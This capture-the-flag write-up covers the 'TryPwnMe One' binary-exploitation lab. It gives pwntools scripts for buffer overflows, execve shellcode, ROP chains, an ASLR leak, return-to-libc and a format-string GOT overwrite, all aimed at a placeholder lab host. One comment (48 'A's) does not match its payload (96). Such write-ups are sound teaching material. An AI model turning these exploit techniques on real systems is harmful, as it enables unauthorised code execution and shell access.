# TryPwnMe One - Complete Writeup

**Difficulty:** Medium  
## TryOverflowMe 1

This is a simple buffer overflow challenge where we need to overflow a buffer to retrieve the flag. The vulnerable program contains a buffer that can be overflowed to overwrite the admin variable, which then allows us to retrieve the flag.
### Exploit Code

```python
from pwn import *

IP = 'MACHINE_IP'
PORT = 9003

# Create payload of 48 'A' characters
# This will overflow the buffer and overwrite the admin variable
payload = b'A' * 96
log.info(f"Payload: {payload}")

# Connect to the remote service
c = remote(IP, PORT)

# Send the payload
c.sendline(payload)

# Receive and print the response (should contain the flag)
r = c.recvall()
print(r.decode())
c.close()
```

## TryOverflowMe 2

This challenge requires us to overflow a buffer AND overwrite a specific variable with a specific value. The buffer is located 76 bytes away from the admin variable, which we need to overwrite with the specific value `0x59595959`.

### Exploit Code

```python
from pwn import *

IP = 'MACHINE_IP'
PORT = 9004

# Offset to reach the target variable
OFFSET = b'A' * 76

# The value we need to write (0x59595959)
# In little-endian: \x59\x59\x59\x59
PAYLOAD = b'\x59\x59\x59\x59'

log.info(f'Payload = {OFFSET+PAYLOAD}')

c = remote(IP, PORT)
c.sendline(OFFSET+PAYLOAD)
r = c.recvall()
print(r.decode())
c.close()
```
## TryExecMe

This challenge involves executing arbitrary shellcode on the target system to gain a shell. The program casts the buffer to a function pointer and then calls it, which leads to arbitrary code execution.

### Shellcode Breakdown

```assembly
\x48\x31\xf6        # xor rsi, rsi          - Clear RSI (argv = NULL)
\x56                # push rsi              - Push NULL onto stack
\x48\xbf/bin//sh    # movabs rdi, "/bin//sh" - Move "/bin//sh" to RDI
\x57                # push rdi              - Push string onto stack
\x54                # push rsp              - Push stack pointer
\x5f                # pop rdi               - Pop address into RDI (filename)
\x6a\x3b            # push 0x3b             - Push 59 (execve syscall number)
\x58                # pop rax               - Pop into RAX
\x99                # cdq                   - Clear RDX (envp = NULL)
\x0f\x05            # syscall               - Execute syscall
```

### Exploit Code

```python
from pwn import *

IP = 'MACHINE_IP'
PORT = 9005

# x86-64 shellcode to execute /bin/sh
# This shellcode calls execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

c = remote(IP, PORT)
c.sendline(shellcode)

# Switch to interactive mode to use the shell
c.interactive()
c.close()
```

## TryRetMe

This challenge introduces Return-Oriented Programming (ROP), a technique used to bypass non-executable stack protections by chaining together existing code snippets called gadgets. The buffer overflow occurs at an offset of 264 bytes. To successfully exploit this vulnerability, we need to use a ret gadget located at `0x00401259` for proper stack alignment before calling the win function at `0x004011e1`. Stack alignment is crucial on modern x86-64 systems, as misaligned stacks can cause the exploit to fail even when the control flow is correctly hijacked.

### Exploit Code

```python
from pwn import *

IP = 'MACHINE_IP'
PORT = 9006

# Offset to control the return address
OFFSET = b'A' * 264

# ret gadget for stack alignment
# Address: 0x00401259
RET_GADGET = p64(0x00401259)

# Address of the win function we want to call
# Address: 0x004011e1
ADDRESS = p64(0x004011e1)

# Build the ROP chain
PAYLOAD = OFFSET + RET_GADGET + ADDRESS

log.info(f"Payload: {PAYLOAD}")

c = remote(IP, PORT)
c.send(PAYLOAD)
c.interactive()
c.close()
```

## Random Memories

This challenge involves defeating Address Space Layout Randomization (ASLR) by leveraging an information leak to calculate the correct addresses at runtime. ASLR randomizes memory addresses on each program execution, making it difficult to predict where functions will be located. However, the program conveniently leaks the address of the vuln function in its output, which we can use as a reference point to calculate the positions of other functions. Since the offset between functions remains constant regardless of ASLR, we can determine the exact location of our target function by adding the known offset to the leaked address.
### Exploit Code

```python
from pwn import *
import re

IP = 'MACHINE_IP'
PORT = 9007

# Buffer overflow offset
OFFSET = b'A' * 264

# Connect and receive initial output containing the leak
c = remote(IP, PORT)
r = c.recvuntil(b"Where are we going? :")

# Parse the leaked address using regex
# Looking for a 12-character hexadecimal address
match = re.search(r'[0-9a-f]{12}', r.decode())
print(r.decode())

# Convert the leaked address from string to integer
Hint = int(match.group(), 16)
log.info(f"Address Hint: {Hint}")

# Calculate addresses based on the leak
# RET_GADGET is at leak + 0x87 (for stack alignment)
RET_GADGET = p64(Hint + 0x87)

# Win function is at leak - 0x109
ADDRESS = p64(Hint - 0x109)

# Build the ROP chain
PAYLOAD = OFFSET + RET_GADGET + ADDRESS

c.send(PAYLOAD)
c.interactive()
c.close()
```

## The Librarian

This challenge demonstrates an advanced exploitation technique called Return-to-libc, which is used to bypass NX (non-executable stack) protection by calling existing library functions instead of injecting shellcode. Since the binary uses dynamically linked libc, we can exploit information leaks to obtain libc addresses and defeat ASLR. The exploit works by chaining ROP gadgets together to ultimately call `system("/bin/sh")` and spawn a shell. This attack requires a two-stage approach: first, we leak libc addresses to calculate the correct function locations, and then we use those addresses to build our final exploit payload.

### Exploit Code

```python
from pwn import *

binary_file = './thelibrarian'
libc = ELF('./libc.so.6')

IP = 'MACHINE_IP'
PORT = 9008

p = remote(IP, PORT)

# Load binary and prepare ROP gadgets
context.binary = binary = ELF(binary_file, checksec=False)
rop = ROP(binary)

padding = b"A" * 264

# ============================================
# STAGE 1: Leak puts address from libc
# ============================================

payload = padding
# Stack alignment gadget
payload += p64(rop.find_gadget(['ret'])[0])
# pop rdi; ret - Set argument for puts
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
# Address of puts in GOT (will contain real libc address)
payload += p64(binary.got.puts)
# Call puts to print its own address
payload += p64(binary.plt.puts)
# Return to main to send second payload
payload += p64(binary.symbols.main)

p.recvuntil(b"Again? Where this time? : \n")
p.sendline(payload)
p.recvuntil(b"ok, let's go!\n\n")

# Receive and parse the leaked address
leak = u64(p.recvline().strip().ljust(8, b'\0'))
log.info(f'Puts leak => {hex(leak)}')

# Calculate libc base address
libc.address = leak - libc.symbols.puts
log.info(f'Libc base => {hex(libc.address)}')

# ============================================
# STAGE 2: Calculate addresses and exploit
# ============================================

# These offsets are specific to this libc version
bin_sh_offset = 0x1b3d88
system_offset = 0x4f420

# Calculate absolute addresses
bin_sh = libc.address + bin_sh_offset
system = libc.address + system_offset

log.info(f'/bin/sh address => {hex(bin_sh)}')
log.info(f'system address => {hex(system)}')

# Build final ROP chain to execute system("/bin/sh")
payload = padding
# pop rdi; ret - Set /bin/sh as first argument
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(bin_sh)
# Call system with /bin/sh as argument
payload += p64(system)
# Additional alignment
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(0x0)

p.recvuntil(b"Again? Where this time? : \n")
p.sendline(payload)
p.recvuntil(b"ok, let's go!\n\n")

# Interact with the spawned shell
p.interactive()
```

## Not Specified

This challenge exploits a format string vulnerability to overwrite a Global Offset Table (GOT) entry and redirect program execution. The vulnerability allows us to write arbitrary values to arbitrary memory addresses, giving us powerful control over the program's behavior. We leverage this capability to overwrite the GOT entry for the `exit` function with the address of the `win` function. As a result, when the program attempts to call `exit()` during its normal execution flow, it actually calls `win()` instead, granting us access to the flag.

### Exploit Code

```python
from pwnlib.fmtstr import *
from pwn import *

IP = 'MACHINE_IP'
PORT = 9009

# Set architecture for proper payload generation
context.clear(arch = 'amd64', endian = 'little')

def send_payload(payload):
    s.recvline()
    s.sendline(payload)
    r = s.recvline()
    return r

# Load binary to extract addresses
elf = ELF('./notspecified')

# Get address of exit in GOT (target we want to overwrite)
exit_got = elf.got['exit']

# Get address of win function (value we want to write)
win_func = elf.symbols['win']

s = remote(IP, PORT)

# Generate format string payload
# Offset 6: Position in stack where our input appears
# {exit_got: win_func}: Dictionary mapping target address to desired value
payload = fmtstr_payload(6, {exit_got: win_func})

log.info(f"Payload: {payload}")
print(send_payload(payload).decode())

s.interactive()
```
